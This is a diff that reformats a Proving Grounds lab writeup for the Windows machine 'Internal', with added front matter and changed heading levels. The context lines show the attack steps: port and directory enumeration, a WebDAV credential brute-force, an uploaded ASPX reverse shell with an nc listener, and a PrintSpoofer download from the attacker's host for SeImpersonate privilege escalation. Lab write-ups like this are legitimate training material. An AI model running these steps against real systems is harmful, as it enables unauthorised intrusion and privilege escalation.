@@ -1,8 +1,15 @@
+---
+title: "Internal"
+difficulty: easy
+os: windows
+description: "Internal — Offensive Security Proving Grounds easy windows writeup."
+---
+
 # Internal
 
 > WebDAV brute / SeImpersonatePrivilege
 
-### Enumerating Services
+## Enumerating Services
 First, we'll perform a generic scan to identify the open ports and services running on this machine.
 ```shell
 # TCP
@@ -19,14 +26,14 @@ PORT      STATE SERVICE       VERSION
 49664/tcp open  msrpc         Microsoft Windows RPC
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
-### Enumerating port 80
+## Enumerating port 80
 ```shell
 # Enum dir
 feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -d 1 -x php,asp,aspx,html,txt -C 404,502 -u http://192.168.182.40
 
 http://192.168.182.40/webdav
 ```
-### Initial Access
+## Initial Access
 We brute-forced WebDAV credentials and uploaded an ASPX reverse shell.
 ```shell
 # Brute Force WebDAV
@@ -40,7 +47,7 @@ put shell.aspx
 # Listener
 rlwrap -cAra nc -vnlp 443
 ```
-### Privilege Escalation
+## Privilege Escalation
 ```shell
 # Tokens
 whoami /priv
@@ -50,7 +57,7 @@ SeImpersonatePrivilege  Enabled
 iwr -uri http://192.168.45.242/PrintSpoofer64.exe -outfile PrintSpoofer64.exe
 .\PrintSpoofer64.exe -i -c cmd
 ```
-### Post-Exploitation
+## Post-Exploitation
 ```shell
 # Evidence
 ipconfig
